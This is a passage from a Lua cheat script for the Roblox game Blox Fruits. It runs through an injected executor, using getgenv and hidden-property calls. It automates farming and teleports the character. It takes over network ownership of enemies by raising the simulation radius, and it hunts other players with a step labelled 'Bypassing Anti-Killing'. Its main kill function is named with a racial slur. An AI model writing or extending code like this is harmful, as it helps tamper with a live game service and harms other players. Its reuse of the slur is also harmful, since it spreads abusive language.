            local OC333 = ""
            if #OC >= 3 then 
                local OC2 = {} 
                for i,v in pairs(OC) do 
                    table.insert(OC2,v)
                    if #OC2 >= #OC/2 then break end 
                end
                OC333 = unpack(OC2)
            else
                OC333 = OC[1]
            end
            if getgenv().ServerData['PlayerBackpack'][OC333.." Fruit"] then  
                task.spawn(function()
                    Tweento(CFrame.new(game.Players.LocalPlayer.Character.PrimaryPart.CFrame.X,game.Players.LocalPlayer.Character.PrimaryPart.CFrame.Y +2000,game.Players.LocalPlayer.Character.PrimaryPart.CFrame.Z))
                end)
                repeat 
                    task.wait()
                    EquipWeaponName(OC333.." Fruit")
                until game.Players.LocalPlayer.Character:FindFirstChild("EatRemote", true)
                game.Players.LocalPlayer.Character:FindFirstChild("EatRemote", true):InvokeServer()
                getgenv().CurrentTask = ''
            end
        end 
    end
    l4432()
    if includedInventory then 
        for i,v in pairs(fruitsSnipes) do 
            if getgenv().ServerData["Inventory Items"][v] then 
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadFruit", v) 
                l4432()
            end
        end
    end
end 
function Storef(v) 
    if getgenv().CurrentTask ~= 'Eat Fruit' and getgenv().CurrentTask ~= 'Auto Sea 3' then 
        return game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
            "StoreFruit",
            tostring(v:GetAttribute("OriginalName")),
            v
        )
    end
end 
function CheckMessage(v1)
    local v1 = tostring(v1)
    local RaidCheck = "Island #%d cleared!" 
    if v1:find('Earned') or v1:find('LEVEL UP') then 
        return 
    end
    if v1:find('Island') and v1:find('cleared') then 
        getgenv().NextRaidIslandId = tonumber(string.match(v1,'%d'))+1
    end 

    if v1:find('spotted') then  
        warn('Pirate raid FOUND!')
        getgenv().PirateRaidTick = tick()
    elseif v1:find('Loading') then 
        getgenv().DimensionLoading = true
    elseif v1:find('Good job') then 
        warn('Pirate raid Cancelled!')
        getgenv().PirateRaidTick = 0 
    elseif v1:find('attack') then 
        getgenv().AttackedSafe = true 
    elseif v1:find('rare item') then 
        getgenv().Config.FireEssencePassed = typeof(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyDragonTalon", true))~= 'string'  
    elseif v1:find('unleashed') then 
        getgenv().RaidBossEvent = true  
    elseif v1:find('barrier') then 
        getgenv().RaidBossEvent = true 
    elseif v1:find('dimension') then 
        getgenv().CakePrince = true 
    elseif v1:find('disappeared') then 
        getgenv().CakePrince = false
    elseif v1:find('legendary item') then  
        getgenv().HallowEssence = true
    elseif v1:find("entered this world") then 
        getgenv().SoulReaper = true
    end 
end
function LoadMessage(v)
    v:GetPropertyChangedSignal('Value'):Connect(function()
        CheckMessage(v.Value)
    end) 
end
local function LoadPlayer() 
    if not IsPlayerAlive() then repeat task.wait(.1) until IsPlayerAlive() end
    if IsPlayerAlive() then
        getgenv().ServerData["PlayerBackpackFruits"] = {}
        getgenv().ServerData["PlayerBackpack"] = {} 
        task.spawn(function()
            repeat task.wait() until loadSkills
            loadSkills()
        end)
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do  
            if v.ClassName =='StringValue' then 
                LoadMessage(v)
            end
            if not getgenv().ServerData["PlayerBackpack"][v.Name] then 
                getgenv().ServerData["PlayerBackpack"][v.Name] = v  
                if v.Name:find('Fruit') then  
                    if v.Name:find('Fruit') then  
                        if not Storef(v) then 
                            local nextid = #getgenv().ServerData["PlayerBackpackFruits"]
                            getgenv().ServerData["PlayerBackpackFruits"][nextid] = v 
                            v:GetPropertyChangedSignal('Parent'):Connect(function() 
                                if not v.Parent then getgenv().ServerData["PlayerBackpackFruits"][nextid]=nil end
                            end) 
                        end
                    end 
                end 
                task.spawn(function()
                    if v:IsA('Tool') and v.ToolTip == 'Melee' then 
                        repeat task.wait() until getgenv().Config and getgenv().Config['Melee Level Values'] getgenv().Config["Melee Level Values"][v.Name] = v:WaitForChild('Level').Value 
                    end
                end)
            end
        end 
        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do 
            if not getgenv().ServerData["PlayerBackpack"][v.Name] then 
                getgenv().ServerData["PlayerBackpack"][v.Name] = v  
                if v.Name:find('Fruit') then  
                    if not Storef(v) then 
                        local nextid = #getgenv().ServerData["PlayerBackpackFruits"]
                        getgenv().ServerData["PlayerBackpackFruits"][nextid] = v 
                        v:GetPropertyChangedSignal('Parent'):Connect(function() 
                            if not v.Parent then getgenv().ServerData["PlayerBackpackFruits"][nextid]=nil end
                        end) 
                    end
                end 
                task.spawn(function()
                    if v:IsA('Tool') and v.ToolTip == 'Melee' then 
                        repeat task.wait() until getgenv().Config and getgenv().Config['Melee Level Values'] getgenv().Config["Melee Level Values"][v.Name] = v:WaitForChild('Level').Value 
                    end
                end)
            end
        end  
        if not getgenv().ServerData['PlayerData'] then getgenv().ServerData['PlayerData'] = {} end
        for i,v in pairs(game.Players.LocalPlayer.Data:GetChildren()) do 
            if tostring(v.ClassName):find('Value') then 
                if not getgenv().ServerData['PlayerData'][v.Name] then 
                    getgenv().ServerData['PlayerData'][v.Name] = v.Value 
                    v:GetPropertyChangedSignal('Value'):Connect(function() 
                        getgenv().ServerData['PlayerData'][v.Name] = v.Value 
                    end)
                end
            end
        end  
        if not game.Players.LocalPlayer.Character:FindFirstChild("Teleport Access") then 
            wait(1)
            if not game.Players.LocalPlayer.Character:FindFirstChild("Teleport Access") then
                local TweenAccess = Instance.new("IntValue")
                TweenAccess.Name = "Teleport Access"
                TweenAccess.Parent = game.Players.LocalPlayer.Character 
                game.Players.LocalPlayer.Backpack.ChildAdded:Connect(function(v)
                    getgenv().ServerData["PlayerBackpack"][v.Name] = v 
                    task.delay(3,function()
                        if v.Name:find('Fruit') then  
                            if not Storef(v) then 
                                local nextid = #getgenv().ServerData["PlayerBackpackFruits"]
                                getgenv().ServerData["PlayerBackpackFruits"][nextid] = v 
                                v:GetPropertyChangedSignal('Parent'):Connect(function() 
                                    if not v.Parent then getgenv().ServerData["PlayerBackpackFruits"][nextid]=nil end
                                end) 
                            end
                        end
                    end) 
                    task.spawn(function()
                        if v:IsA('Tool') and v.ToolTip == 'Melee' then 
                            repeat task.wait() until getgenv().Config and getgenv().Config['Melee Level Values'] getgenv().Config["Melee Level Values"][v.Name] = v:WaitForChild('Level').Value 
                        end
                    end)
                    for newids,v2 in pairs(getgenv().ServerData["PlayerBackpack"]) do 
                        
                        if not game.Players.LocalPlayer.Character:FindFirstChild(newids) and not game.Players.LocalPlayer.Backpack:FindFirstChild(newids) then 
                            getgenv().ServerData["PlayerBackpack"][newids] = nil 
         
                        end
                    end 

                end)
                game.Players.LocalPlayer.Character.ChildAdded:Connect(function(newchild) 
                    if newchild.ClassName =='StringValue' then 
                        LoadMessage(newchild)
                    end
                    if newchild.Name:find('Fruit') then  
                        if not Storef(newchild) then 
                            local nextid = #getgenv().ServerData["PlayerBackpackFruits"]
                            getgenv().ServerData["PlayerBackpackFruits"][nextid] = newchild 
                            newchild:GetPropertyChangedSignal('Parent'):Connect(function() 
                                if not newchild.Parent then getgenv().ServerData["PlayerBackpackFruits"][nextid]=nil end
                            end) 
                        end
                    end 
                end)
            end
        end

    end
end
function AddNoknockback(enemy)
    local humanoid = enemy.PrimaryPart or enemy:WaitForChild('HumanoidRootPart',3)
    if not humanoid then return end  -- Nếu enemy không có Humanoid, thoát hàm

    humanoid.ChildAdded:Connect(function(child)
        if child:IsA("BodyVelocity") or child:IsA("BodyPosition") then
            child.MaxForce = Vector3.new(0, 0, 0)
            child.P = 0 
        elseif child:IsA("BodyGyro") then 
            child.P = 0 
            child.MaxTorque = Vector3.new(0, 0, 0) -- Sửa thành MaxTorque
        end
    end)
end 

game.workspace.Characters.ChildAdded:Connect(LoadPlayer)
getgenv().Ticktp = tick() 
local tween_s = game:service "TweenService"
function Tweento(targetCFrame)
    if CheckPlayerAlive() then
        if not game.Players.LocalPlayer.Character:FindFirstChild("Teleport Access") then
            return warn('I cant tween right now: Teleport Perm Missing')
        end
        if not TweenSpeed or type(TweenSpeed) ~= "number" then
            TweenSpeed = 325
        end
        
        local targetPos = targetCFrame.Position
        local Distance =
            (targetPos -
            game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude
        if Distance <= 300 and tick() - getgenv().Ticktp >= 0.01 then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
            getgenv().Ticktp = tick()
            return
        end
        local bmg, bmg2 = CheckNearestTeleporter(targetCFrame)
        if bmg then
            local timetry = 0
            repeat
                pcall(
                    function()
                        getgenv().tween:Cancel()
                    end
                )
                wait()
                requestEntrance(bmg, bmg2)
                timetry = timetry + 1
            until not CheckNearestTeleporter(targetCFrame) or timetry >= 10
            if timetry >= 10 and CheckNearestTeleporter(targetCFrame) then
                if bmg2 == "Temple Of Time" then
                    table.insert(BlackListLocation, bmg2)
                end
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            end
        end
        local tweenfunc = {}
        local info =
            TweenInfo.new(
                (targetPos -
                game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude /
                TweenSpeed,
            Enum.EasingStyle.Linear
        )
        getgenv().tween =
            tween_s:Create(
            game:GetService("Players").LocalPlayer.Character["HumanoidRootPart"],
            info,
            {CFrame = targetCFrame}
        )
        getgenv().tween:Play()
        function tweenfunc:Stop()
            getgenv().tween:Cancel()
        end
        getgenv().TweenStats = getgenv().tween.PlaybackState
        tween.Completed:Wait()
        getgenv().TweenStats = getgenv().tween.PlaybackState
        return tweenfunc 
    end
end  
function GetCFrameADD(v2)
    task.wait()
    if game.Players.LocalPlayer.Character.Humanoid.Sit then 
        SendKey('Space',.5) 
    end
    return CFrame.new(0,40,0)
end 
local TweenK
local function TweenKill(v)
    if not CheckPlayerAlive() then return end
    if v and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then  
        local DISCC = GetDistance(v.HumanoidRootPart)
        if DISCC > 1000 then 
            Tweento(v.HumanoidRootPart.CFrame * GetCFrameADD())
        elseif DISCC > 3 then
            local tweenfunc = {}
            local tween_s = game:service "TweenService"
            local info =
                TweenInfo.new(
                GetDistance(v.HumanoidRootPart) /
                    300,
                Enum.EasingStyle.Linear
            )
            if GetDistance(v.HumanoidRootPart) < 200 then 
                if getgenv().tween then 
                    getgenv().tween:Cancel()
                    getgenv().tween = nil 
                end
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * GetCFrameADD() 
            else 
                getgenv().tween =
                    tween_s:Create(
                    game:GetService("Players").LocalPlayer.Character["HumanoidRootPart"],
                    info,
                    {CFrame = v.HumanoidRootPart.CFrame * GetCFrameADD()}
                )
                getgenv().tween:Play() 
            end
        end
    end
    task.wait()
end
function IsBoss(nv,raidb)
    if typeof(nv) == "string" then 
        nv = CheckBoss(nv).Name
        if nv:find("Friend") then 
            return true 
        end
    end
    if nv then 
        local Bossb = raidb and "Raid Boss" or not raidb and "Boss"
        local a,b = pcall(function()
            if nv.Humanoid.DisplayName and string.find(nv.Humanoid.DisplayName,Bossb)  then 
                return true 
            end 
            return false
        end)
        if a then return b end
    end
end
function GetMidPointPart(tbpart)
    local pascal
    local allpas = 0
    for i, v in pairs(tbpart) do
        pcall(
            function()
                if not pascal then
                    pascal = v.Position
                else
                    pascal = pascal + v.Position
                end
                allpas = allpas + 1
            end
        )
    end
    return pascal / allpas
end
function EnableBuso()
    if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
        local args = {
            [1] = "Buso"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
end  
function GetWeapon(wptype)
    local s 
    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") and v.ToolTip == wptype then
            s=v
        end
    end
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA("Tool") and v.ToolTip == wptype then
            s = v
        end
    end
    return s
end 
function LoadItem(d)
    if getgenv().ServerData["PlayerBackpack"][d] then
        return
    end
    warn('Loaditem',d)
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadItem", d)
end 
function EquipWeapon(ToolSe)
    if getgenv().WeaponType == "" or getgenv().WeaponType == nil then
        getgenv().WeaponType = "Melee"
    end
    if not ToolSe then 
        if getgenv().CurrentTask ~='Auto Item : Cursed Dual Katana' then 
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(GetWeapon(getgenv().WeaponType))
        else
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(GetWeapon('Sword'))
        end
    else
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
        wait(.4)
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
    end
end 
function AddBodyVelocity(enable)
    if not enable then  
        if game.Players.LocalPlayer.Character.Head:FindFirstChildOfClass("BodyVelocity") then 
            game.Players.LocalPlayer.Character.Head:FindFirstChildOfClass("BodyVelocity"):Destroy()
        end
        return
    end
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
        if v:IsA("BasePart") or v:IsA("Part") then 
            v.CanCollide = false 
        end
    end
    if not game.Players.LocalPlayer.Character.Head:FindFirstChild("NEWQL") then 
        local OV = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character.Head)
        OV.Velocity = Vector3.new(0, 0, 0)
        OV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        OV.P = 15000
        OV.Name = "NEWQL"
    end
end
local Elites = {
    "Deandre",
    "Urban",
    "Diablo"
}
local KillingBoss
local KillingMobTick = tick()-10
local MobUsingSkill = false 
function CanMasteryFarm(v)
    if v and v.Humanoid and v.Humanoid.Health < (v.Humanoid.MaxHealth * Config.Percent/100) then 
        return true 
    end
end 
function CheckSkill(skillstable,blacklistedskills)
    if not blacklistedskills then 
        blacklistedskills = {}
    end 
    if skillstable['Z'] then 
        return "Z"
    elseif skillstable['X'] then 
        return "X"
    elseif skillstable["C"] then 
        return "C"
    end
end 
function addCheckSkill(v)
    if v:FindFirstChildOfClass('Humanoid') then
        local animator = v:FindFirstChildOfClass('Humanoid'):FindFirstChildOfClass('Animator')
        if animator then
            animator.AnimationPlayed:Connect(function(anitrack) 
                if anitrack.Animation.AnimationId ~= 'rbxassetid://9802959564' and anitrack.Animation.AnimationId ~= 'rbxassetid://507766388' and anitrack.Animation.AnimationId ~='http://www.roblox.com/asset/?id=9884584522' then  
                    local realTimePos = anitrack.TimePosition
                    if realTimePos <= 0 then 
                        realTimePos = 1.5
                    end
                    if getgenv().DogdeUntil and tick() < getgenv().DogdeUntil then  
                        getgenv().DogdeUntil = getgenv().DogdeUntil+math.floor(realTimePos)
                    else 
                        getgenv().DogdeUntil = tick()+math.floor(realTimePos)
                    end
                    if getgenv().tween then 
                        getgenv().tween:Cancel()
                        getgenv().tween = nil 
                    end
                    --game.Players.LocalPlayer.Character.PrimaryPart.CFrame = game.Players.LocalPlayer.Character.PrimaryPart.CFrame * CFrame.new(0,300,0)
                    warn('Dogde Skill Please sirrrr',anitrack.TimePosition,math.floor(realTimePos)+1,anitrack.Animation.AnimationId)
                end
            end)
        end
    end
end
function KillNigga(MobInstance) 
    local LS,LS2 = pcall(function()
        if IsPlayerAlive() and
        MobInstance and MobInstance:FindFirstChild("Humanoid") and
        MobInstance.Humanoid.Health > 0
        then
            local mmas = GetMidPoint(MobInstance.Name, MobInstance.HumanoidRootPart)
            local LockCFrame
            if mmas and not string.find(MobInstance.Name, "Boss") and MobInstance.Humanoid.MaxHealth < 130000 then
                LockCFrame = CFrame.new(mmas)
            else
                LockCFrame = MobInstance.HumanoidRootPart.CFrame
                KillingBoss = true
            end 
            local N_Name = MobInstance.Name
            --[[
                        
            if string.find(N_Name, "Boss") or table.find(Elites, N_Name) then
                if not string.find(N_Name, "Boss") then
                    for i, v in pairs(Elites) do
                        if RemoveLevelTitle(v) == RemoveLevelTitle(N_Name) then
                            KillingBoss = true
                        end
                    end
                else
                    KillingBoss = true
                end
            end
            ]]
            SetContent('Kill Mobs '..tostring(N_Name))
            --[[
                        if IsBoss(MobInstance) then 
                KillingBoss = true 
            end
            if not KillingBoss then
                --CheckReqHop(Nasga.HumanoidRootPart.CFrame,Nasga)
            end
            for i, v in pairs({
                "Deandre [Lv. 1750]",
                "Urban [Lv. 1750]",
                "Diablo [Lv. 1750]"
            }) do
                if RemoveLevelTitle(v) == RemoveLevelTitle(MobInstance.Name) then
                    KillingBoss = true
                end
            end
            ]] 
            local BringMobSuccess
            task.delay(1,function() 
                BringMobSuccess = true
            end)
            task.delay(.01 ,function()
                repeat task.wait() until GetDistance(MobInstance.PrimaryPart) < 140 
                addCheckSkill(MobInstance)
                if BringMob(MobInstance, LockCFrame) then 
                    task.wait(.275)
                    BringMobSuccess = true 
                else    
                    BringMobSuccess =true 
                end
            end)             
            if getgenv().KillAuraConnection then 
                getgenv().KillAuraConnection:Disconnect()
                getgenv().KillAuraConnection = nil 
            end
            repeat
                task.wait() 
                if IsPlayerAlive() then 
                    if not getgenv().DogdeUntil or getgenv().DogdeUntil < tick() then 
                        KillingMob = true
                        KillingMobTick = tick()
                        AddBodyVelocity(true)
                        EquipWeapon()
                        TweenKill(MobInstance) 
                        if BringMobSuccess then 
                            getgenv().UseFAttack = true  
                        end  
                    else 
                        getgenv().UseFAttack = false 
                        game.Players.LocalPlayer.Character.PrimaryPart.CFrame = MobInstance.PrimaryPart.CFrame * CFrame.new(0,300,0)
                    end
                else 
                    getgenv().UseFAttack = false
                end 
            until not MobInstance or not MobInstance:FindFirstChildOfClass("Humanoid") or not MobInstance:FindFirstChild("HumanoidRootPart") or
            MobInstance.Humanoid.Health <= 0 or not IsPlayerAlive() or 
                CheckIsRaiding()
            SetContent('...')
            game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
            KillingMobTick = 0
            KillingMob = false
            getgenv().UseFAttack = false  
            AddBodyVelocity(false)
            return true
        end
    end)
    if not LS then print('ls',LS2) end
end  
function CheckMob(mobormoblist,rep)
    if typeof(mobormoblist) == 'table' then 
        for i,v in pairs(mobormoblist) do 
            for __,v2 in pairs(game.workspace.Enemies:GetChildren()) do 
                if RemoveLevelTitle(v) == RemoveLevelTitle(v2.Name) and v2:FindFirstChild('Humanoid') and v2.Humanoid.Health > 0 then 
                    return v2
                end
            end
        end
        if rep then 
            for i,v in pairs(mobormoblist) do 
                for __,v2 in pairs(game.ReplicatedStorage:GetChildren()) do 
                    if RemoveLevelTitle(v) == RemoveLevelTitle(v2.Name) and v2:FindFirstChild('Humanoid') and v2.Humanoid.Health > 0 then 
                        return v2
                    end
                end
            end
        end
    else
        for i,v in pairs(game.workspace.Enemies:GetChildren()) do 
            if RemoveLevelTitle(v.Name) == RemoveLevelTitle(mobormoblist) and v:FindFirstChild('Humanoid') and v.Humanoid.Health > 0 then 
                return v
            end
        end
        if rep then 
            for i,v in pairs(game.ReplicatedStorage:GetChildren()) do 
                if RemoveLevelTitle(v.Name) == RemoveLevelTitle(mobormoblist) and v:FindFirstChild('Humanoid') and v.Humanoid.Health > 0 then 
                    return v
                end
            end
        end
    end
end
function getMobSpawnbyList(MobList)
    local Returner = {}
    for i,v in pairs(MobList) do 
        if MobSpawnClone[v] then 
            table.insert(Returner,MobSpawnClone[v]) 
            for i2,v2 in pairs(game.Workspace.MobSpawns:GetChildren()) do 
                if v2.Name == v and GetDistance(v2,MobSpawnClone[v]) > 300 then 
                    table.insert(Returner,v2.CFrame)
                end 
            end 
        end
    end
    return Returner  
end
function KillMobList(MobList)
    for i,v in pairs(MobList) do 
        MobList[i] = RemoveLevelTitle(v)
    end
    local NM = CheckMob(MobList)
    if NM then 
        KillNigga(NM)
    else
        local MS = getMobSpawnbyList(MobList) 
        if MS then 
            for i,v in pairs(MS) do 
                if not CheckMob(MobList) and v then 
                    SetContent('Waitting ')
                    Tweento(v * CFrame.new(0,50,0))
                    wait(1)
                end
            end
        end
    end
end
function KillBoss(BossInstance)
    if not BossInstance or not BossInstance:FindFirstChild('Humanoid') then return end 
    warn('Killing boss:',BossInstance.Name)
    if not game.Workspace.Enemies:FindFirstChild(BossInstance.Name) then  
        SetContent('Kill boss '..BossInstance.Name)
        Tweento(BossInstance.PrimaryPart.CFrame * CFrame.new(0,50,0))
    end
    return KillNigga(BossInstance)
end
function BringMob(TAR,V5)
    if not TAR then 
        return
    end
    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 3100)
    if not TAR:FindFirstChild("Bringed") then 
        local Bringed = Instance.new("IntValue",TAR)
        Bringed.Name = "Bringed" 
    else
        return
    end
    V6 = TAR.HumanoidRootPart.CFrame
    if V5 then 
        V6 = V5 
    end  
    if TAR then
        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if v.PrimaryPart and
                RemoveLevelTitle(v.Name) == RemoveLevelTitle(TAR.Name) and 
                    (V6.Position - v.HumanoidRootPart.Position).Magnitude < 340 and
                    (isnetworkowner2(v.HumanoidRootPart) or isnetworkowner(v.HumanoidRootPart)) and
                    v.Humanoid.MaxHealth < 100000
            then
                task.spawn(function()
                    TweenObject(V6,v.PrimaryPart,1000)
                    v.PrimaryPart.CanCollide = false
                    v.Head.CanCollide = false
                    v.Humanoid.WalkSpeed = 0
                    v.Humanoid.JumpPower = 0 
                    v.Humanoid.AutoRotate = false
                end)
            end
        end
    end 
    return true
end  
function GetNearestPlayer(pos)
    local ner = math.huge
    local ner2
    for i, v in pairs(game.Players:GetChildren()) do
        if
            v.Character and v.Character:FindFirstChild("HumanoidRootPart") and
                (v.Character.HumanoidRootPart.Position - pos).Magnitude < ner
         then
            ner = (v.Character.HumanoidRootPart.Position - pos).Magnitude 
            ner2 = v.Name
        end
    end
    if game.Players.LocalPlayer.Name == ner2 then
        return true
    end
end
function isnetworkowner2(p1)
    local A = gethiddenproperty(game.Players.LocalPlayer, "SimulationRadius")
    local B = game.Players.LocalPlayer.Character or Wait(game.Players.LocalPlayer.CharacterAdded)
    local C = game.WaitForChild(B, "HumanoidRootPart", 300)
    if C then
        if p1.Anchored then
            return false
        end
        if game.IsDescendantOf(p1, B) or (C.Position - p1.Position).Magnitude <= A and GetNearestPlayer(p1.Position) then
            return true
        end
    end
end 
function Click()
    local VirtualUser = game:GetService("VirtualUser")
    VirtualUser:CaptureController()
    VirtualUser:ClickButton1(Vector2.new(851, 158), game:GetService("Workspace").Camera.CFrame)
end
local cancelKill = false  
getgenv().AttackedSafe = false 
function CancelKillPlayer()
    cancelKill = true 
end 
function CheckSafeZone(p)
    for i, v in pairs(game:GetService("Workspace")["_WorldOrigin"].SafeZones:GetChildren()) do
        if v:IsA("Part") then
            if
                GetDistance(v,p.PrimaryPart) <= 400 and
                    p.Humanoid.Health / p.Humanoid.MaxHealth >= 90 / 100
             then
                return true
            end
        end
    end
    if getgenv().AttackedSafe then 
        getgenv().AttackedSafe = false 
        return true 
    end
end
function KillPlayer(PlayerName)
    warn('KillPlayer',PlayerName) 
    SetContent('Kill Player '..tostring(PlayerName))
    local t = game:GetService("Workspace").Characters:FindFirstChild(PlayerName)
    local tRoot = t.PrimaryPart or t:FindFirstChild('HumanoidRootPart')
    local tHumanoid = t:FindFirstChild('Humanoid')
    local getNeartick = tick()-5555
    local totRoot = GetDistance(tRoot)
    local StartKillTick = tick()
    local IsSafeZone = false
    repeat 
        task.wait()
        if IsPlayerAlive() then
            EquipWeapon()
            IsSafeZone = CheckSafeZone(t)
            if game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible then 
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")
            end
            totRoot = GetDistance(tRoot)
            game.Players.LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.PrimaryPart.CFrame.X,tRoot.CFrame.Y,game.Players.LocalPlayer.Character.PrimaryPart.CFrame.Z)
            if totRoot < 50 then 
                if tick()-getNeartick > 100 then 
                    getNeartick = tick()
                    repeat  
                        SetContent('Bypassing Anti-Killing')
                        task.wait()
                        game.Players.LocalPlayer.Character.PrimaryPart.CFrame = tRoot.CFrame * CFrame.new(0,100,10)
                        getgenv().UseFAttack = false
                    until tick()-getNeartick > 5 and tick()-getNeartick < 100
                    game.Players.LocalPlayer.Character.PrimaryPart.CFrame = tRoot.CFrame * CFrame.new(0,0,10)
                elseif tick()-getNeartick > 5 and tick()-getNeartick < 100 then 
                    KillingMob = true
                    EquipWeapon()
                    if t:FindFirstChildOfClass('Tool') and t:FindFirstChildOfClass('Tool'):FindFirstChild('Holding') and t:FindFirstChildOfClass('Tool'):FindFirstChild('Holding').Value then 
                        SetContent(' Use skill'..PlayerName)
                        game.Players.LocalPlayer.Character.PrimaryPart.CFrame = tRoot.CFrame * CFrame.new(0,50,15)
                        SendKey('Z')
                        SendKey('X')
                    else
                        task.spawn(function()
                            game.Players.LocalPlayer.Character.PrimaryPart.CFrame = tRoot.CFrame * CFrame.new(0,0,2.5)
                        end)
                        
                        getgenv().UseFAttack = true
                        SendKey('Z')
                        SendKey('X')
                    end
                end
            else
                Tweento(tRoot.CFrame * CFrame.new(0,30,0))
            end 
        else
            getNeartick = tick()-5555
        end
    until cancelKill or IsSafeZone or tick()-StartKillTick > 60 or not t or not t.Parent or not game:GetService("Workspace").Characters:FindFirstChild(PlayerName) or not tRoot or not tRoot.Parent or not tHumanoid or tHumanoid.Health <= 0 
    cancelKill = false 
    KillingMob = false
    
    StartKillTick = tick()
    getgenv().UseFAttack = false
    if IsSafeZone or tick()-StartKillTick > 60 then 
        warn('Kill Failed:',PlayerName) 
        SetContent('Kill Failed: '..tostring(PlayerName))
        return false 
    else 
        warn('Kill Success:',PlayerName) 
        SetContent('Kill Success: '..tostring(PlayerName))
        return true 
    end
end 
function getNearestRaidIsland()
    local function GetI(vId)  
        local Nears = math.huge 
        local ChildSet 
        for i,v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
            if v.Name == 'Island '..vId and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v.Position).Magnitude <= 4500 then 
                ChildSet = v 
                Nears = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v.Position).Magnitude 
            end 
        end 
        return ChildSet
    end 
    if getgenv().NextRaidIslandId then
        return GetI(getgenv().NextRaidIslandId)
    end 
    local nextg
    for i = 5,1,-1 do   
        nextg = GetI(i)          
        if nextg then
            return nextg 
        end 
    end
end 
function CheckIsRaiding()
    local checkraid2 = getgenv().ServerData['Nearest Raid Island']
    local checkraid1 = game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible == true
    if checkraid1 then 
        return checkraid1 
    else 
        return checkraid2 
    end 
end
local lplr = game.Players.LocalPlayer
if not isnetworkowner then
    isnetworkowner = function(part)
        if isnetworkowner2(part) then
            return isnetworkowner2(part)
        end
        return part.ReceiveAge == 0 and GetNearestPlayer(part.Position)
    end
else
    warn("already isnetworkowner 😎😎😎") -- bruh
end
function FlyBoat(e,b,h)
    if not b then return end 
    if not h then h = 200 end 
    local fakevh = b.Engine
    local vh = b:FindFirstChildOfClass('VehicleSeat')
    if e then 
        vh.Name = 'L'
        local bodyV = vh:WaitForChild('BodyVelocity',.1)
        if bodyV then 
            bodyV.Parent = fakevh 
        end
        local bodyP = vh:WaitForChild('BodyPosition')
        bodyP.Position = Vector3.new(0,h,0)
        vh:GetPropertyChangedSignal('Position'):Connect(function()
            bodyP.Position = Vector3.new(0,h,0)
        end)
    else 
        local bodyV = fakevh:WaitForChild('BodyVelocity',.1)
        if bodyV then 
            bodyV.Parent = vh 
        end
        vh.Name = 'VehicleSeat'
        local bodyP = vh:WaitForChild('BodyPosition')
        bodyP.Position = Vector3.new(0,b.WaterOrigin.Value ,0)
    end
end

function EquipWeaponName(fff)
    if not fff then
        return
    end
    NoClip = true
    local ToolSe = fff
    if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
        wait(.4)
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
    end
end
function IsWpSKillLoaded(ki)
    if game:GetService("Players")["LocalPlayer"].PlayerGui.Main.Skills:FindFirstChild(ki) then
        return true
    end
end
function EquipAllWeapon()
    local u3 = {
        "Melee",
        "Blox Fruit",
        "Sword",
        "Gun"
    }
    local u3_2 = {}
    for i, v in pairs(u3) do
        u3_3 = GetWeapon(v)
        if u3_3 and u3_3 ~= "" then table.insert(u3_2, u3_3) end
    end
    for i, v in pairs(u3_2) do
        if not IsWpSKillLoaded(v) then
            EquipWeaponName(v)
        end
    end
end
local GuideModule = require(game:GetService("ReplicatedStorage").GuideModule)
local Quest = require(game:GetService("ReplicatedStorage").Quests) 
local v17 = require(game.ReplicatedStorage:WaitForChild("GuideModule"))
local CFrameByLevelQuest = {} 
local UselessQuest = {
    "BartiloQuest",
    "Trainees",
    "MarineQuest",
    "CitizenQuest"
}
for i,v in pairs(GuideModule["Data"].NPCList) do
	for i1,v1 in pairs(v["Levels"]) do
		if not CFrameByLevelQuest[v1] then 
            CFrameByLevelQuest[v1] = i.CFrame 
        end
	end
end  
function IsHavingQuest()
    for i, v in next, v17.Data do
        if i == "QuestData" then
            return true
        end
    end
    return false
end 
function CheckCurrentQuestMob()
    local a
    if IsHavingQuest() then
        for i, v in next, v17.Data.QuestData.Task do
            a = i
        end
    end
    return a
end
function CheckQuestByLevel(cq)
    local cq = cq or {} 
    local lvlPl = cq.Level or game.Players.LocalPlayer.Data.Level.Value 
    local LevelMaxReq = 99999
    local DoubleQuest = cq.DoubleQuest or false 
    local Returner = {
        ["LevelReq"] = 0,
        ["Mob"] = "",
        ["QuestName"] = "",
        ["QuestId"] = 0,
    }
    if game.PlaceId == 2753915549 then 
